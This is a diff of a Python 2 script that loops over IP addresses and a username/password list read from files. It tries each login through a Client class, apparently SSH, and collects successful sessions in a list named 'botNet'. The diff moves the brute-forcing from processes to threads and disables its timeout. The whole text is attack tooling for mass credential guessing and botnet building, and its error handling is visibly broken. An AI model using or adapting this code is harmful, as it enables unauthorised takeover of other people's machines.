@@ -7,7 +7,7 @@ import sys
 import time
 import signal
 from time import sleep
-import multiprocessing
+import threading
 
 class Client:
 
@@ -52,7 +52,7 @@ def print_color(text, color):
     else:
         print(text + "\nColor not found!")
 
-def timeoutFn(ip, credentials, output):
+def timeoutFn(ip, credentials):
 
     class TimeoutError(Exception):
         pass
@@ -61,20 +61,17 @@ def timeoutFn(ip, credentials, output):
         raise TimeoutError()
 
     for user, passwd in credentials:
-        signal.signal(signal.SIGALRM, handler)
-        signal.alarm(10)
+        #signal.signal(signal.SIGALRM, handler)
+        #signal.alarm(10)
         try:
             result = Client(ip, user, passwd)
-        except TimeoutError as exc:
+        except: #TimeoutError as exc:
             result = None
         finally:
-            signal.alarm(0)
+            #signal.alarm(0)
             if result.session is not None:
-                print "hi"
-                output.put(result)
+                botNet.append(result)
                 break
-
-output = multiprocessing.Queue()
 
 botNet = []
 
@@ -84,24 +81,17 @@ with open('/etc/ips') as f:
 with open('/etc/pass') as f:
     credentials = [x.strip().split(':') for x in f.readlines()]
 
-pool = []
+threads = []
 
 for ip in ips:
-        pool.append(multiprocessing.Process(target=timeoutFn, args=(ip, credentials, output)))
+    t = threading.Thread(target=timeoutFn, args=(ip, credentials))
+    threads.append(t)
+    t.start()
 
-for p in pool:
-    p.start()
-
-for p in pool:
-    p.join()
-
-while not output.empty():
-    client = results.get()
-    botNet.append(client)
+for t in threads:
+    t.join()
 
 print botNet
-
-
 
 # for ip in ips:
 #     for user, passwd in credentials:
